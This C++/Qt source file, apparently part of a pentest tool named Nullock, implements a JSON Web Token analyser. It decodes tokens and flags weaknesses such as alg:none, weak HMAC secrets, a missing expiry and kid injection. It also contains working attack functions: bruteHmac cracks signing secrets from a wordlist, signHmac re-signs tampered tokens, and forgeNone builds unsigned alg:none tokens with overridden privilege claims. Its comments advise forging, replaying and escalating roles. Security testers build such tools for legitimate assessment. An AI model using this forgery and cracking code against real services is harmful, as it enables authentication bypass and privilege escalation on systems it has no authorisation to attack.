#include "jwt_tool.hpp"

#include <QCryptographicHash>
#include <QDateTime>
#include <QJsonDocument>
#include <QMessageAuthenticationCode>

namespace Nullock::Core::JwtTool {

namespace {

QByteArray b64urlDecode(const QString &s) {
    return QByteArray::fromBase64(s.toUtf8(),
        QByteArray::Base64UrlEncoding | QByteArray::OmitTrailingEquals);
}

QString b64urlEncode(const QByteArray &b) {
    return QString::fromLatin1(b.toBase64(
        QByteArray::Base64UrlEncoding | QByteArray::OmitTrailingEquals));
}

QString prettyJson(const QByteArray &raw, QJsonObject *out) {
    QJsonParseError err;
    const QJsonDocument doc = QJsonDocument::fromJson(raw, &err);
    if (err.error != QJsonParseError::NoError || !doc.isObject()) return {};
    if (out) *out = doc.object();
    return QString::fromUtf8(doc.toJson(QJsonDocument::Indented));
}

QCryptographicHash::Algorithm hashForAlg(const QString &alg) {
    if (alg.endsWith("384")) return QCryptographicHash::Sha384;
    if (alg.endsWith("512")) return QCryptographicHash::Sha512;
    return QCryptographicHash::Sha256;   // HS256 + default
}

} // namespace

Decoded decode(const QString &token) {
    Decoded d;
    const QStringList parts = token.trimmed().split('.');
    if (parts.size() < 2) {
        d.error = "not a JWT (need at least header.payload)";
        return d;
    }
    const QByteArray headerRaw  = b64urlDecode(parts[0]);
    const QByteArray payloadRaw = b64urlDecode(parts[1]);
    d.headerJson  = prettyJson(headerRaw,  &d.header);
    d.payloadJson = prettyJson(payloadRaw, &d.payload);
    if (d.headerJson.isEmpty()) {
        d.error = "header is not valid base64url JSON";
        return d;
    }
    d.alg = d.header.value("alg").toString();
    d.typ = d.header.value("typ").toString();
    d.kid = d.header.value("kid").toString();
    if (parts.size() >= 3) d.signature = b64urlDecode(parts[2]);
    d.signingInput = (parts[0] + "." + parts[1]).toUtf8();
    d.ok = true;
    return d;
}

QList<Weakness> analyze(const Decoded &d, qint64 nowEpoch) {
    QList<Weakness> out;
    if (!d.ok) return out;
    if (nowEpoch == 0) nowEpoch = QDateTime::currentSecsSinceEpoch();

    const QString algLow = d.alg.toLower();

    // alg:none -- the canonical auth-bypass. If the server honours it,
    // any token is accepted with no signature.
    if (algLow == "none" || algLow.isEmpty()) {
        out.append({ "jwt-alg-none", "critical",
            "alg is '" + (d.alg.isEmpty() ? QString("(absent)") : d.alg)
            + "' -- if the server accepts unsigned tokens this is a full "
              "authentication bypass. Forge with the 'none' attack and replay." });
    }

    // HMAC family -- weak-secret brute and RS->HS confusion surface.
    if (algLow.startsWith("hs")) {
        out.append({ "jwt-hmac-alg", "info",
            d.alg + " is symmetric (HMAC). If the secret is weak it can be "
            "brute-forced; if the server also accepts RS256 it may be "
            "vulnerable to an algorithm-confusion attack (sign with the "
            "public key as the HMAC secret)." });
    }

    // exp handling.
    if (!d.payload.contains("exp")) {
        out.append({ "jwt-no-exp", "medium",
            "no 'exp' claim -- this token never expires. A leaked token is "
            "valid forever." });
    } else {
        const qint64 exp = static_cast<qint64>(d.payload.value("exp").toDouble());
        if (exp > 0 && exp < nowEpoch) {
            out.append({ "jwt-expired", "info",
                "token expired at epoch " + QString::number(exp)
                + " -- if the server still accepts it, expiry isn't enforced." });
        } else if (exp - nowEpoch > 60LL * 60 * 24 * 365) {
            out.append({ "jwt-long-exp", "low",
                "exp is more than a year out -- excessive token lifetime." });
        }
    }

    // kid injection surface.
    if (!d.kid.isEmpty()) {
        const bool risky = d.kid.contains('/') || d.kid.contains("..")
                        || d.kid.contains('\'') || d.kid.contains(';')
                        || d.kid.contains(' ');
        out.append({ "jwt-kid", risky ? "medium" : "info",
            "kid = '" + d.kid + "'"
            + (risky ? " -- contains path/quote chars; test for path traversal "
                       "or SQL injection in the key lookup."
                     : " -- if the server resolves this to a key file/row, test "
                       "kid injection (path traversal / SQLi).") });
    }

    // Privilege claims worth tampering once you can forge.
    static const QStringList privKeys = {
        "admin", "is_admin", "isAdmin", "role", "roles", "scope",
        "scopes", "groups", "permissions", "is_superuser",
    };
    for (const QString &k : privKeys) {
        if (d.payload.contains(k)) {
            out.append({ "jwt-priv-claim", "info",
                "payload carries a privilege claim '" + k + "' = "
                + QString::fromUtf8(QJsonDocument(QJsonObject{{k, d.payload.value(k)}})
                       .toJson(QJsonDocument::Compact))
                + " -- prime target for tampering under a forging attack." });
            break;
        }
    }

    return out;
}

QString bruteHmac(const Decoded &d, const QStringList &candidates) {
    if (!d.ok || d.signature.isEmpty()) return {};
    const QCryptographicHash::Algorithm h = hashForAlg(d.alg);
    for (const QString &cand : candidates) {
        const QByteArray mac = QMessageAuthenticationCode::hash(
            d.signingInput, cand.toUtf8(), h);
        if (mac == d.signature) return cand;
    }
    return {};
}

QString signHmac(const QJsonObject &header,
                 const QJsonObject &payload,
                 const QByteArray &secret) {
    const QString alg = header.value("alg").toString("HS256");
    const QCryptographicHash::Algorithm h = hashForAlg(alg);
    const QByteArray hb = QJsonDocument(header).toJson(QJsonDocument::Compact);
    const QByteArray pb = QJsonDocument(payload).toJson(QJsonDocument::Compact);
    const QByteArray signingInput = b64urlEncode(hb).toUtf8() + "."
                                  + b64urlEncode(pb).toUtf8();
    const QByteArray mac = QMessageAuthenticationCode::hash(signingInput, secret, h);
    return QString::fromUtf8(signingInput) + "." + b64urlEncode(mac);
}

QString forgeNone(const Decoded &d, const QJsonObject &claimOverrides) {
    QJsonObject header = d.header;
    header["alg"] = "none";
    QJsonObject payload = d.payload;
    for (auto it = claimOverrides.begin(); it != claimOverrides.end(); ++it)
        payload[it.key()] = it.value();
    const QByteArray hb = QJsonDocument(header).toJson(QJsonDocument::Compact);
    const QByteArray pb = QJsonDocument(payload).toJson(QJsonDocument::Compact);
    // Trailing dot, empty signature -- the alg:none wire format.
    return b64urlEncode(hb) + "." + b64urlEncode(pb) + ".";
}

} // namespace Nullock::Core::JwtTool
